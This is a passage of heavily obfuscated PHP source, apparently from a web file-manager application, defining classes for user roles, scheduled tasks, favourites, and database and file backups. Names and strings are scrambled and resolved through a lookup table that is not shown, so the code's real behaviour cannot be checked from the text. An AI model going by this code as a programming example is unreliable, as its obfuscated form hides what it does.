ˆ›ô, $”ï³‡¤ã), $ØÕÆ¿Ä[1261]); } } class Message { function __construct() { } public function send($şìíôà¡ = '', $ößª÷Í = array(), $â—­´œ = "\x74\145\x78\164") { $şûÖ™ç =& $_SERVER[¢ñàß¿€]; $úáÎÈöÖ = array($şûÖ™ç[33] => $şûÖ™ç[1620], $şûÖ™ç[171] => $şìíôà¡); if (in_array($â—­´œ, array($şûÖ™ç[1620], $şûÖ™ç[1621]))) { $úáÎÈöÖ[$şûÖ™ç[33]] = $â—­´œ; } $ößª÷Í = array($şûÖ™ç[578] => isset($ößª÷Í[$şûÖ™ç[578]]) ? $ößª÷Í[$şûÖ™ç[578]] : $şûÖ™ç[12], $şûÖ™ç[662] => isset($ößª÷Í[$şûÖ™ç[662]]) ? $ößª÷Í[$şûÖ™ç[662]] : $şûÖ™ç[12]); if (empty($şìíôà¡) || empty($ößª÷Í[$şûÖ™ç[578]]) && empty($ößª÷Í[$şûÖ™ç[662]])) { return !1; } $¹­ä–ĞŸ = array($şûÖ™ç[1548] => $úáÎÈöÖ, $şûÖ™ç[1622] => $ößª÷Í); Hook::trigger($şûÖ™ç[1623], $¹­ä–ĞŸ); } } goto C„’·¸£Š“; BèáÍˆÖò: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\x72\x6f\154\x65\x4c\x69\163\164"; public $field = array("\156\141\155\x65", "\141\x75\x74\x68", "\x6c\141\x62\145\x6c", "\144\x69\x73\x70\154\x61\171", "\163\171\163\164\x65\x6d", "\x64\145\x73\143", "\151\147\x6e\x6f\x72\145\x45\170\164", "\151\147\x6e\x6f\x72\145\106\151\154\145\123\x69\x7a\x65", "\x61\x64\x6d\151\x6e\x69\x73\164\162\x61\x74\157\162", "\163\157\162\x74"); public function listData($„€‘ÜáÍ = false, $ì”êÄÒ‘ = "\x73\157\x72\164", $šî»…ğî = false) { $îªÅ¶£Ş =& $_SERVER[¢ñàß¿€]; $ĞòŠù¯· = parent::listData($„€‘ÜáÍ, $ì”êÄÒ‘, $šî»…ğî); if (!$„€‘ÜáÍ) { foreach ($ĞòŠù¯· as $ÂÆÓÀã¡ => $áøÀ˜ûÍ) { if ($áøÀ˜ûÍ[$îªÅ¶£Ş[2175]] == 1) { $ĞòŠù¯·[$ÂÆÓÀã¡][$îªÅ¶£Ş[526]] = LNG($îªÅ¶£Ş[2436]); } } } return $ĞòŠù¯·; } public function update($—çşØÇÃ, $ÔÉûìá) { $è©Şó“° =& $_SERVER[¢ñàß¿€]; $˜›¨×õ = parent::listData($—çşØÇÃ); $ßÇßêÆÍ = $this->findByName($ÔÉûìá[$è©Şó“°[32]]); if (!$˜›¨×õ || $ßÇßêÆÍ && $ßÇßêÆÍ[$è©Şó“°[475]] != $˜›¨×õ[$è©Şó“°[475]]) { return !1; } if ($ßÇßêÆÍ[$è©Şó“°[2175]] == 1) { $ÔÉûìá = array($è©Şó“°[32] => $ÔÉûìá[$è©Şó“°[32]], $è©Şó“°[1991] => $ÔÉûìá[$è©Şó“°[1991]]); } $this->filterAuth($ÔÉûìá[$è©Şó“°[487]]); return parent::update($—çşØÇÃ, $ÔÉûìá); } public function remove($æÑ£­˜í) { $Û“Ç–¤° = parent::listData($æÑ£­˜í); if (!$Û“Ç–¤° || $Û“Ç–¤°[$_SERVER[¢ñàß¿€][191]]) { return !1; } return parent::remove($æÑ£­˜í); } public function add($í¦˜¦•É) { $¼’ûèæß =& $_SERVER[¢ñàß¿€]; $½šó¼ = $í¦˜¦•É[$¼’ûèæß[32]]; if ($this->findByName($½šó¼)) { return !1; } $õáîÆ = array($¼’ûèæß[494] => $½šó¼, $¼’ûèæß[1974] => $¼’ûèæß[12], $¼’ûèæß[1970] => $¼’ûèæß[1978], $¼’ûèæß[2437] => 1, $¼’ûèæß[1973] => 0, $¼’ûèæß[2438] => 0, $¼’ûèæß[1972] => $this->getSort()); $í¦˜¦•É = array_merge($õáîÆ, $í¦˜¦•É); $this->filterAuth($í¦˜¦•É[$¼’ûèæß[487]]); return parent::insert($í¦˜¦•É); } private function getSort() { $¾É¸ÖÇª =& $_SERVER[¢ñàß¿€]; $—…±Úå² = parent::listData(); $ôõä¨ß• = array_to_keyvalue($—…±Úå², $¾É¸ÖÇª[12], $¾É¸ÖÇª[1992]); return empty($ôõä¨ß•) ? 0 : max($ôõä¨ß•) + 1; } private function filterAuth(&$“£‘‘™) { $±Îøåúî =& $_SERVER[¢ñàß¿€]; $²ôªŸ« = array(); $’»ŞËâê = array_filter(explode($±Îøåúî[50], $“£‘‘™)); foreach ($’»ŞËâê as $“£‘‘™) { $±ÄÈÃ¾ = explode($±Îøåúî[10], $“£‘‘™); if ($±ÄÈÃ¾[0] == $±Îøåúî[2439] && $±ÄÈÃ¾[1] != $±Îøåúî[1272]) { $ÇĞÃ¬‘ = $±ÄÈÃ¾[0] . $±Îøåúî[10] . $±ÄÈÃ¾[1] . $±Îøåúî[2440]; if (!in_array($ÇĞÃ¬‘, $’»ŞËâê)) { $²ôªŸ«[] = $ÇĞÃ¬‘; } } $²ôªŸ«[] = $“£‘‘™; } $“£‘‘™ = implode($±Îøåúî[50], $²ôªŸ«); } public function findRoleDefault() { $Ìª©ˆˆØ =& $_SERVER[¢ñàß¿€]; $ˆ½üûõ½ = parent::listData(); $›‚ ó±© = !1; foreach ($ˆ½üûõ½ as $Åœ•†µ) { if (!$Åœ•†µ || $Åœ•†µ[$Ìª©ˆˆØ[1990]] == $Ìª©ˆˆØ[228] || $Åœ•†µ[$Ìª©ˆˆØ[2175]] == 1) { continue; } if (strstr($Åœ•†µ[$Ìª©ˆˆØ[487]], $Ìª©ˆˆØ[2441])) { continue; } if (!strstr($Åœ•†µ[$Ìª©ˆˆØ[487]], $Ìª©ˆˆØ[2442])) { continue; } if (!$›‚ ó±©) { $›‚ ó±© = $Åœ•†µ; continue; } $âŸ±€ª = explode($Ìª©ˆˆØ[50], $›‚ ó±©[$Ìª©ˆˆØ[487]]); $ıµĞ°ÄÊ = explode($Ìª©ˆˆØ[50], $Åœ•†µ[$Ìª©ˆˆØ[487]]); if (count($âŸ±€ª) > count($ıµĞ°ÄÊ)) { $›‚ ó±© = $Åœ•†µ; } } return $›‚ ó±© ? $›‚ ó±©[$Ìª©ˆˆØ[475]] : $Ìª©ˆˆØ[12]; } public function sort($ØíÌŒ¶Æ, $Æ¡¸ã”í) { return parent::update($ØíÌŒ¶Æ, $Æ¡¸ã”í); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\x74\x61\163\x6b\114\x69\x73\164"; public $field = array("\x6e\x61\155\x65", "\x74\171\x70\x65", "\145\166\145\x6e\164", "\164\x69\x6d\x65", "\144\145\163\143", "\163\171\163\x74\145\155", "\145\156\141\142\154\x65", "\x6c\141\163\x74\x52\x75\156", "\163\157\x72\164"); public function listData($ˆ”ªİº = false, $Ù¸¢Ñ²ş = "\x73\157\162\164", $¥õæšÜÓ = false) { return parent::listData($ˆ”ªİº, $Ù¸¢Ñ²ş, $¥õæšÜÓ); } public function add($ôğßÈ¶‚) { $ËÌ¬ñ¬Ó =& $_SERVER[¢ñàß¿€]; $ÌÇë„´Æ = $this->findByName($ôğßÈ¶‚[$ËÌ¬ñ¬Ó[32]]); if ($ÌÇë„´Æ) { return !1; } $ôğßÈ¶‚[$ËÌ¬ñ¬Ó[1721]] = 0; $ôğßÈ¶‚[$ËÌ¬ñ¬Ó[1992]] = $this->getSort(); return parent::insert($ôğßÈ¶‚); } private function getSort() { $¶»¨Ÿ¦õ =& $_SERVER[¢ñàß¿€]; $Ü®ÄŠŞ€ = parent::listData(); $›¯ª·İ = array_to_keyvalue($Ü®ÄŠŞ€, $¶»¨Ÿ¦õ[12], $¶»¨Ÿ¦õ[1992]); return empty($›¯ª·İ) ? 0 : max($›¯ª·İ) + 1; } public function update($€ãö™Ü, $ƒ‹Æî£›) { $‰şüØÆÈ =& $_SERVER[¢ñàß¿€]; $¹ÂÀâŒë = $this->listData($€ãö™Ü); $›¼á¸“  = $this->findByName($ƒ‹Æî£›[$‰şüØÆÈ[32]]); if (!$¹ÂÀâŒë || $›¼á¸“  && $›¼á¸“ [$‰şüØÆÈ[475]] != $¹ÂÀâŒë[$‰şüØÆÈ[475]]) { return !1; } return parent::update($€ãö™Ü, $ƒ‹Æî£›); } public function remove($Â’Ñî´•, $º³´ƒ©å = false) { $ËÀŠœİş =& $_SERVER[¢ñàß¿€]; $¦Ì‡®Îì = $this->listData($Â’Ñî´•); if (!$¦Ì‡®Îì) { return; } if (!$º³´ƒ©å && $¦Ì‡®Îì[$ËÀŠœİş[191]] == $ËÀŠœİş[91]) { return !1; } return parent::remove($Â’Ñî´•); } public function enable($ùÅÅ²–â, $×ÔêŸ¿) { return $this->update($ùÅÅ²–â, array($_SERVER[¢ñàß¿€][2431] => $×ÔêŸ¿)); } public function run($š»íæ¶Ö) { return $this->update($š»íæ¶Ö, array($_SERVER[¢ñàß¿€][2443] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($™±£äò«) { $ÜöµĞó£ =& $_SERVER[¢ñàß¿€]; return array($ÜöµĞó£[2083] => array(USER_ID, $ÜöµĞó£[2444])); } protected function listData() { $˜„ÔˆÚ… =& $_SERVER[¢ñàß¿€]; $ê¡çÂ± = array($˜„ÔˆÚ…[1761] => USER_ID, $˜„ÔˆÚ…[557] => 0); $•¯ƒ™áÉ = $˜„ÔˆÚ…[2445]; $ºÅ¥Ùø’ = $this->field($•¯ƒ™áÉ)->where($ê¡çÂ±)->order($˜„ÔˆÚ…[2446])->select(); return $ºÅ¥Ùø’ ? $ºÅ¥Ùø’ : array(); } protected function resetCache() { } protected function listView() { $ÕÏ÷Ş»ƒ =& $_SERVER[¢ñàß¿€]; $«‹Õ˜ûõ = $this->listData(); $Ÿ¥ŸŒÍ­ = array_filter_by_field($«‹Õ˜ûõ, $ÕÏ÷Ş»ƒ[33], $ÕÏ÷Ş»ƒ[490]); $°ÁÖÍÁÇ = array_to_keyvalue($Ÿ¥ŸŒÍ­, $ÕÏ÷Ş»ƒ[12], $ÕÏ÷Ş»ƒ[87]); if (!$°ÁÖÍÁÇ) { return $«‹Õ˜ûõ; } $ŸëòÕÏ = 2000; $¼ÃŒìêÄ = array($ÕÏ÷Ş»ƒ[491] => array($ÕÏ÷Ş»ƒ[492], $°ÁÖÍÁÇ)); $ÚÑ¿êô± = Model($ÕÏ÷Ş»ƒ[895])->listSource($¼ÃŒìêÄ, $ŸëòÕÏ); $ÚÑ¿êô± = array_merge($ÚÑ¿êô±[$ÕÏ÷Ş»ƒ[86]], $ÚÑ¿êô±[$ÕÏ÷Ş»ƒ[85]]); $ÚÑ¿êô± = array_to_keyvalue($ÚÑ¿êô±, $ÕÏ÷Ş»ƒ[193]); foreach ($«‹Õ˜ûõ as $œ½ı»¬ => $™Íˆ³…) { $ß©†ˆ¢ = $ÚÑ¿êô±[$™Íˆ³…[$ÕÏ÷Ş»ƒ[87]]]; $ß©†ˆ¢ = $ß©†ˆ¢ ? $ß©†ˆ¢ : array(); $«‹Õ˜ûõ[$œ½ı»¬] = array_merge($ß©†ˆ¢, $™Íˆ³…); } return $«‹Õ˜ûõ; } protected function addFav($·ê‡ÂÖ, $ä¬ä¼êØ = '', $†±«¨’ = "\x73\x6f\x75\162\143\145") { $è”Éä =& $_SERVER[¢ñàß¿€]; $«‰õŠÕİ = array($è”Éä[1761] => USER_ID, $è”Éä[557] => 0, $è”Éä[496] => $†±«¨’, $è”Éä[495] => $·ê‡ÂÖ); if ($this->where($«‰õŠÕİ)->find()) { return !1; } $«‰õŠÕİ = array($è”Éä[1761] => USER_ID, $è”Éä[557] => 0); $´Šğ¾ï = $this->where($«‰õŠÕİ)->max($è”Éä[1992]); if (!$´Šğ¾ï) { $´Šğ¾ï = 0; } if (!$ä¬ä¼êØ && $†±«¨’ == $è”Éä[490]) { $ÔÆ¨ÄÚ¹ = Model($è”Éä[1414])->where(array($è”Éä[491] => $·ê‡ÂÖ))->find(); if (!$ÔÆ¨ÄÚ¹) { return !1; } $ä¬ä¼êØ = $ÔÆ¨ÄÚ¹[$è”Éä[32]]; } $ä¬ä¼êØ = $this->getAutoName($ä¬ä¼êØ); $Š¢Éß§¡ = array($è”Éä[1761] => USER_ID, $è”Éä[557] => 0, $è”Éä[494] => $ä¬ä¼êØ, $è”Éä[495] => $·ê‡ÂÖ, $è”Éä[496] => $†±«¨’, $è”Éä[1972] => $´Šğ¾ï + 1); return $this->add($Š¢Éß§¡); } protected function remove($—¬‹úæ) { $Ö—‚š±ã =& $_SERVER[¢ñàß¿€]; $àîæ«½« = array($Ö—‚š±ã[1761] => USER_ID, $Ö—‚š±ã[493] => $—¬‹úæ); return $this->where($àîæ«½«)->delete(); } protected function removeByName($ù½¤µç³) { $¼•©ë˜İ =& $_SERVER[¢ñàß¿€]; $šë”Œ Â = array($¼•©ë˜İ[1761] => USER_ID, $¼•©ë˜İ[494] => $ù½¤µç³, $¼•©ë˜İ[557] => 0); return $this->where($šë”Œ Â)->delete(); } protected function rename($æß†û½¯, $“ÛÍ«) { $òİœ²Ÿ´ =& $_SERVER[¢ñàß¿€]; if ($æß†û½¯ == $“ÛÍ«) { return !1; } $ªÚûû¦‹ = $this->getAutoName($“ÛÍ«); if ($“ÛÍ« != $ªÚûû¦‹) { return !1; } $Õ¶‰¢¼£ = array($òİœ²Ÿ´[1761] => USER_ID, $òİœ²Ÿ´[557] => 0, $òİœ²Ÿ´[32] => $æß†û½¯); return $this->where($Õ¶‰¢¼£)->save(array($òİœ²Ÿ´[32] => $“ÛÍ«)); } protected function resetSort($ğÃà¥Ïì) { $ÔÊûñç½ =& $_SERVER[¢ñàß¿€]; $ğÃà¥Ïì = is_array($ğÃà¥Ïì) ? $ğÃà¥Ïì : array(); $÷®Ø°Ÿ = array($ÔÊûñç½[1761] => USER_ID); for ($–¨³ãÊ = 0; $–¨³ãÊ < count($ğÃà¥Ïì); $–¨³ãÊ++) { $÷®Ø°Ÿ[$ÔÊûñç½[493]] = $ğÃà¥Ïì[$–¨³ãÊ]; $this->where($÷®Ø°Ÿ)->save(array($ÔÊûñç½[1972] => $–¨³ãÊ + 1)); } return !0; } protected function moveTop($Ú¦îŠÂ) { $÷ƒÄäçÃ =& $_SERVER[¢ñàß¿€]; $ó¹Ï„€¶ = array($÷ƒÄäçÃ[1761] => USER_ID, $÷ƒÄäçÃ[557] => 0); $¤É­Ñ = $this->where($ó¹Ï„€¶)->where(array($÷ƒÄäçÃ[32] => $Ú¦îŠÂ))->find(); if (!$¤É­Ñ) { return; } $’åˆ¸·« = $this->field($÷ƒÄäçÃ[475])->where($ó¹Ï„€¶)->order($÷ƒÄäçÃ[2446])->select(); $’åˆ¸·« = array_to_keyvalue($’åˆ¸·«, $÷ƒÄäçÃ[12], $÷ƒÄäçÃ[475]); $öİñª‰ı = $’åˆ¸·«; $’åˆ¸·« = array_remove_value($’åˆ¸·«, $¤É­Ñ[$÷ƒÄäçÃ[475]]); array_unshift($’åˆ¸·«, $¤É­Ñ[$÷ƒÄäçÃ[475]]); return $this->resetSort($’åˆ¸·«); } protected function moveBottom($†–÷îÚÙ) { $•ìØıü =& $_SERVER[¢ñàß¿€]; $îõÌò†‹ = array($•ìØıü[1761] => USER_ID, $•ìØıü[557] => 0); $È¤ğ†¾Ù = $this->where($îõÌò†‹)->max($•ìØıü[1992]); $©ÖÂ´º¼ = array($•ìØıü[1992] => $È¤ğ†¾Ù + 1); return $this->where($îõÌò†‹)->where(array($•ìØıü[32] => $†–÷îÚÙ))->save($©ÖÂ´º¼); } private function getAutoName($¾çñãÆÀ) { $ı€£ö³³ =& $_SERVER[¢ñàß¿€]; $‘ñëó©¦ = array($ı€£ö³³[1761] => USER_ID, $ı€£ö³³[557] => 0); $ˆÜéÙ™ = $this->field($ı€£ö³³[32])->where($‘ñëó©¦)->select(); $ˆÜéÙ™ = array_to_keyvalue($ˆÜéÙ™, $ı€£ö³³[12], $ı€£ö³³[32]); if (!$ˆÜéÙ™ || !in_array($¾çñãÆÀ, $ˆÜéÙ™)) { return $¾çñãÆÀ; } for ($®Ù½ìÓ› = 0; $®Ù½ìÓ› < count($ˆÜéÙ™); $®Ù½ìÓ›++) { if (!in_array($¾çñãÆÀ . "\x28{$®Ù½ìÓ›}\x29", $ˆÜéÙ™)) { return $¾çñãÆÀ . "\50{$®Ù½ìÓ›}\51"; } } return $¾çñãÆÀ . "\50{$®Ù½ìÓ›}\x29"; } } goto b¸æ¡Çäœ†; b¶Ê«¯µ´µ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $Ø¶À¶Ñ =& $_SERVER[¢ñàß¿€]; $á§ßë˜à = Backup::get(); self::$io = $á§ßë˜à[$Ø¶À¶Ñ[823]]; self::$name = $á§ßë˜à[$Ø¶À¶Ñ[32]]; $–ÀÈÍ˜³ = new DbManage(); $©â¹Âœ™ = $–ÀÈÍ˜³->dbType(); $ÇƒŞÜí = array($Ø¶À¶Ñ[848] => $©â¹Âœ™, $Ø¶À¶Ñ[849] => time()); Backup::set($ÇƒŞÜí); $åíùöÊ¸ = $this->tmpFilesPath() . $Ø¶À¶Ñ[850] . self::$name . $Ø¶À¶Ñ[8]; del_dir($åíùöÊ¸); mk_dir($åíùöÊ¸); $ØƒĞ¦ÊÊ = $‚ìÈæ¦¹ = 0; try { $†‘Şå°÷ = $–ÀÈÍ˜³->db()->getTables(); } catch (Exception $‡ùİ†Šø) { return !1; } $†‘Şå°÷ = array_diff($†‘Şå°÷, array($Ø¶À¶Ñ[851], $Ø¶À¶Ñ[852])); foreach ($†‘Şå°÷ as $üğê´…¸) { $ØƒĞ¦ÊÊ += $–ÀÈÍ˜³->model($üğê´…¸)->count(); } $¿ë´ÓÉŸ = new Task($Ø¶À¶Ñ[853], $Ø¶À¶Ñ[854], $ØƒĞ¦ÊÊ, LNG($Ø¶À¶Ñ[855]) . $Ø¶À¶Ñ[856] . LNG($Ø¶À¶Ñ[857])); $GLOBALS[$Ø¶À¶Ñ[858]] = self::$name; foreach ($†‘Şå°÷ as $üğê´…¸) { $ˆ¼¨ç½Ù = $åíùöÊ¸ . $üğê´…¸ . $Ø¶À¶Ñ[859]; $ŞääÚ¦ã = null; if ($üğê´…¸ == $Ø¶À¶Ñ[860] && (!isset($á§ßë˜à[$Ø¶À¶Ñ[171]]) || $á§ßë˜à[$Ø¶À¶Ñ[171]] == $Ø¶À¶Ñ[228])) { $ŞääÚ¦ã = self::$io; } $‚ìÈæ¦¹ += $–ÀÈÍ˜³->sqlFromDb($üğê´…¸, $ˆ¼¨ç½Ù, $¿ë´ÓÉŸ, $ŞääÚ¦ã); } unset($GLOBALS[$Ø¶À¶Ñ[858]]); $¿ë´ÓÉŸ->end(); if ($‚ìÈæ¦¹ > $ØƒĞ¦ÊÊ) { $ØƒĞ¦ÊÊ = $‚ìÈæ¦¹; } $ÇƒŞÜí = array($Ø¶À¶Ñ[848] => $©â¹Âœ™, $Ø¶À¶Ñ[844] => 1, $Ø¶À¶Ñ[861] => $ØƒĞ¦ÊÊ, $Ø¶À¶Ñ[862] => $‚ìÈæ¦¹, $Ø¶À¶Ñ[863] => time()); Backup::set($ÇƒŞÜí); if ($ØƒĞ¦ÊÊ - $‚ìÈæ¦¹ > 0) { $Á°Ó×É¯ = $Ø¶À¶Ñ[864]; if (!stristr(I18n::getType(), $Ø¶À¶Ñ[865])) { $Á°Ó×É¯ = $Ø¶À¶Ñ[866]; } write_log(array($Á°Ó×É¯, $ÇƒŞÜí), $Ø¶À¶Ñ[854]); return !1; } return !0; } private function tmpFilesPath() { $±Å­óº› =& $_SERVER[¢ñàß¿€]; $èÔûëº­ = TEMP_FILES; if ($GLOBALS[$±Å­óº›[6]][$±Å­óº›[92]][$±Å­óº›[867]]) { $èÔûëº­ = $GLOBALS[$±Å­óº›[6]][$±Å­óº›[92]][$±Å­óº›[867]]; if (!mk_dir($èÔûëº­) || !is_writable($èÔûëº­) || !IO::mkfile($èÔûëº­ . $±Å­óº›[868])) { $èÔûëº­ = TEMP_FILES; } } return $èÔûëº­; } } class BackupDbFile { public function __construct() { } public function index() { $Áˆ¹†ü› =& $_SERVER[¢ñàß¿€]; $‚é¹ÚİÂ = Backup::get(); $“øÕöÅó = $‚é¹ÚİÂ[$Áˆ¹†ü›[32]]; $ÚØ­è°½ = $this->tmpFilesPath() . "\x62\x61\x63\x6b\165\x70\x5f{$“øÕöÅó}\57"; $Şü˜öæí = $this->backupPath($‚é¹ÚİÂ); if (!($Şü˜öæí = IO::mkdir($Şü˜öæí))) { return !1; } $«¥ˆÚÁ• = IO::listPath($ÚØ­è°½); $şö÷òå = isset($«¥ˆÚÁ•[$Áˆ¹†ü›[86]]) ? $«¥ˆÚÁ•[$Áˆ¹†ü›[86]] : array(); $á®“˜ìÜ = array_sum(array_column($şö÷òå, $Áˆ¹†ü›[79])); if (!$á®“˜ìÜ) { return !1; } $’±ÑòÛ¡ = array($Áˆ¹†ü›[869] => $á®“˜ìÜ, $Áˆ¹†ü›[870] => time()); Backup::set($’±ÑòÛ¡); $ÁÂ®¸÷ = new TaskFileTransfer($Áˆ¹†ü›[871], $Áˆ¹†ü›[854], count($şö÷òå), LNG($Áˆ¹†ü›[855]) . $Áˆ¹†ü›[462] . LNG($Áˆ¹†ü›[857]) . $Áˆ¹†ü›[872]); $ÁÂ®¸÷->task[$Áˆ¹†ü›[834]] = $á®“˜ìÜ; foreach ($«¥ˆÚÁ•[$Áˆ¹†ü›[86]] as $ŸÓÄŞÚ) { $ĞÀ–ôÆ = IO::move($ŸÓÄŞÚ[$Áˆ¹†ü›[87]], $Şü˜öæí); if (!$ĞÀ–ôÆ) { $ÁÂ®¸÷->end(); $İö³øÛ° = IO::getLastError($Áˆ¹†ü›[873] . $ŸÓÄŞÚ[$Áˆ¹†ü›[87]] . $Áˆ¹†ü›[874] . $Şü˜öæí . $Áˆ¹†ü›[178]); write_log($İö³øÛ°, $Áˆ¹†ü›[854]); return !1; } } $’ÒÔ´ÑÄ = new DbManage(); $ß½Í»øÜ = $’ÒÔ´ÑÄ->getSqlFile(); if (!$ß½Í»øÜ[$Áˆ¹†ü›[875]] || !$ß½Í»øÜ[$Áˆ¹†ü›[13]]) { return !1; } IO::move($ß½Í»øÜ[$Áˆ¹†ü›[875]], $Şü˜öæí); IO::move($ß½Í»øÜ[$Áˆ¹†ü›[13]], $Şü˜öæí); $ÁÂ®¸÷->end(); $’±ÑòÛ¡ = array($Áˆ¹†ü›[876] => $á®“˜ìÜ, $Áˆ¹†ü›[877] => time()); Backup::set($’±ÑòÛ¡); return !0; } private function backupPath($µÁ¸¶¾Õ) { $ší³ôÑ =& $_SERVER[¢ñàß¿€]; $Şë½ß« = $µÁ¸¶¾Õ[$ší³ôÑ[32]]; $ô¢Ö–æ = Model($ší³ôÑ[841])->get($ší³ôÑ[842]); $€Œå‹¶Æ = substr(md5($ší³ôÑ[843] . $ô¢Ö–æ . $Şë½ß«), 0, 8); return "\x7b\151\x6f\x3a{$µÁ¸¶¾Õ[$ší³ôÑ[823]]}\175\57\x64\141\164\x61\142\141\x73\x65\57\142\x61\143\153\165\x70\57" . $Şë½ß« . $ší³ôÑ[11] . $€Œå‹¶Æ; } private function tmpFilesPath() { $ŠĞØÄ‚ú =& $_SERVER[¢ñàß¿€]; $Û±ç¶Ò® = TEMP_FILES; if ($GLOBALS[$ŠĞØÄ‚ú[6]][$ŠĞØÄ‚ú[92]][$ŠĞØÄ‚ú[867]]) { $Û±ç¶Ò® = $GLOBALS[$ŠĞØÄ‚ú[6]][$ŠĞØÄ‚ú[92]][$ŠĞØÄ‚ú[867]]; if (!mk_dir($Û±ç¶Ò®) || !is_writable($Û±ç¶Ò®) || !IO::mkfile($Û±ç¶Ò® . $ŠĞØÄ‚ú[868])) { $Û±ç¶Ò® = TEMP_FILES; } } return $Û±ç¶Ò®; } } class BackupFile { public function __construct() { } public function index() { $ÜÖ•ÊåŒ = Backup::get(); $·ï§ò Â = $ÜÖ•ÊåŒ[$_SERVER[¢ñàß¿€][369]][$_SERVER[¢ñàß¿€][230]][$_SERVER[¢ñàß¿€][541]]; $Äù–°Å = array($_SERVER[¢ñàß¿€][542] => array($_SERVER[¢ñàß¿€][878], $·ï§ò Â), $_SERVER[¢ñàß¿€][879] => array($_SERVER[¢ñàß¿€][407], $ÜÖ•ÊåŒ[$_SERVER[¢ñàß¿€][823]])); $òŞÍÌ—Ÿ = (int) Model($_SERVER[¢ñàß¿€][860])->where($Äù–°Å)->count($_SERVER[¢ñàß¿€][541]); $åÒÈ©Ö¥ = (int) Model($_SERVER[¢ñàß¿€][860])->where($Äù–°Å)->sum($_SERVER[¢ñàß¿€][79]); $Á­¥ñĞ• = new TaskFileTransfer($_SERVER[¢ñàß¿€][880], $_SERVER[¢ñàß¿€][854], $òŞÍÌ—Ÿ, LNG($_SERVER[¢ñàß¿€][855]) . $_SERVER[¢ñàß¿€][856] . LNG($_SERVER[¢ñàß¿€][881])); $Á­¥ñĞ•->task[$_SERVER[¢ñàß¿€][834]] = $åÒÈ©Ö¥; $”Ô˜ıœİ = array($_SERVER[¢ñàß¿€][882] => $òŞÍÌ—Ÿ, $_SERVER[¢ñàß¿€][883] => $åÒÈ©Ö¥, $_SERVER[¢ñàß¿€][884] => time()); Backup::set($”Ô˜ıœİ); $­»§ç£ñ = !0; $ÒöÖ˜ = $this->storeIds(); $ü°ÛÁ–õ = 1; $À«ÙöÇÚ = 1000; $å¥ñÏÑâ = $½Ú¿‰î§ = 0; $ŸçÜÎ = array(); $›œ÷ÇÀ = $øèÃê°ü = 0; do { $‚İ€¶› = $_SERVER[¢ñàß¿€][885]; $«ã•â = Model($_SERVER[¢ñàß¿€][860])->where($Äù–°Å)->field($‚İ€¶›)->order($_SERVER[¢ñàß¿€][886])->selectPage($À«ÙöÇÚ, $ü°ÛÁ–õ); $óêâˆ³û = !empty($«ã•â[$_SERVER[¢ñàß¿€][445]]) ? $«ã•â[$_SERVER[¢ñàß¿€][445]] : array(); foreach ($óêâˆ³û as $ãæ”Ñ¿) { if (!$this->_fileExist($ãæ”Ñ¿, $ŸçÜÎ, $ÒöÖ˜)) { write_log("\146\x69\154\x65\40\x6e\x6f\164\x20\145\170\x69\x73\x74\56\146\151\x6c\145\x49\104\x3a{$ãæ”Ñ¿[$_SERVER[¢ñàß¿€][541]]}\54\x20\160\141\x74\150\72{$ãæ”Ñ¿[$_SERVER[¢ñàß¿€][87]]}", $_SERVER[¢ñàß¿€][887]); continue; } $ÁÛŒ–çî = $ãæ”Ñ¿[$_SERVER[¢ñàß¿€][87]]; $É¸ô²ş¬ = "\173\x69\x6f\72{$ÜÖ•ÊåŒ[$_SERVER[¢ñàß¿€][823]]}\x7d" . substr($ÁÛŒ–çî, strlen("\173\x69\157\72{$ãæ”Ñ¿[$_SERVER[¢ñàß¿€][888]]}\175")); if (IO::exist($É¸ô²ş¬)) { $Á­¥ñĞ•->updateFileEnd($ãæ”Ñ¿[$_SERVER[¢ñàß¿€][32]], $ãæ”Ñ¿[$_SERVER[¢ñàß¿€][79]]); } else { $É¸ô²ş¬ = get_path_father($É¸ô²ş¬); IO::mkdir($É¸ô²ş¬); if (!IO::copy($ÁÛŒ–çî, $É¸ô²ş¬, $_SERVER[¢ñàß¿€][889])) { write_log($_SERVER[¢ñàß¿€][890] . $ÁÛŒ–çî . $_SERVER[¢ñàß¿€][874] . $É¸ô²ş¬ . $_SERVER[¢ñàß¿€][178], $_SERVER[¢ñàß¿€][854]); $­»§ç£ñ = !1; break; } } $·ï§ò Â = $ãæ”Ñ¿[$_SERVER[¢ñàß¿€][541]]; $½Ú¿‰î§ += 1; $å¥ñÏÑâ += $ãæ”Ñ¿[$_SERVER[¢ñàß¿€][79]]; $øèÃê°ü += 1; $›œ÷ÇÀ += $ãæ”Ñ¿[$_SERVER[¢ñàß¿€][79]]; if ($å¥ñÏÑâ >= 1024 * 1024 * 100) { $”Ô˜ıœİ = array($_SERVER[¢ñàß¿€][822] => $·ï§ò Â, $_SERVER[¢ñàß¿€][891] => $øèÃê°ü, $_SERVER[¢ñàß¿€][892] => $›œ÷ÇÀ); Backup::set($”Ô˜ıœİ); $å¥ñÏÑâ = $½Ú¿‰î§ = 0; } } $æ®ˆƒÂ¼ = count($óêâˆ³û); $ü°ÛÁ–õ++; } while ($æ®ˆƒÂ¼ == $À«ÙöÇÚ); $Á­¥ñĞ•->end(); $”Ô˜ıœİ = array($_SERVER[¢ñàß¿€][893] => 1, $_SERVER[¢ñàß¿€][832] => time(), $_SERVER[¢ñàß¿€][846] => 1, $_SERVER[¢ñàß¿€][822] => $·ï§ò Â, $_SERVER[¢ñàß¿€][894] => time()); if ($½Ú¿‰î§) { $”Ô˜ıœİ[$_SERVER[¢ñàß¿€][891]] = $øèÃê°ü; $”Ô˜ıœİ[$_SERVER[¢ñàß¿€][892]] = $›œ÷ÇÀ; } Backup::set($”Ô˜ıœİ); return !0; } private function _fileExist($…ïíš›™, &$©èëú•¥, $î©ÊüÍë) { $°ˆªÁÅ• =& $_SERVER[¢ñàß¿€]; $š¡¦èÊ¡ = $…ïíš›™[$°ˆªÁÅ•[87]]; if (in_array($…ïíš›™[$°ˆªÁÅ•[541]], $©èëú•¥)) { return !1; } if (!in_array($…ïíš›™[$°ˆªÁÅ•[888]], $î©ÊüÍë)) { return !1; } if (IO::exist($š¡¦èÊ¡)) { return !0; } $öİ³ˆ € = get_path_father($š¡¦èÊ¡); if (IO::exist($öİ³ˆ €)) { $©èëú•¥[] = 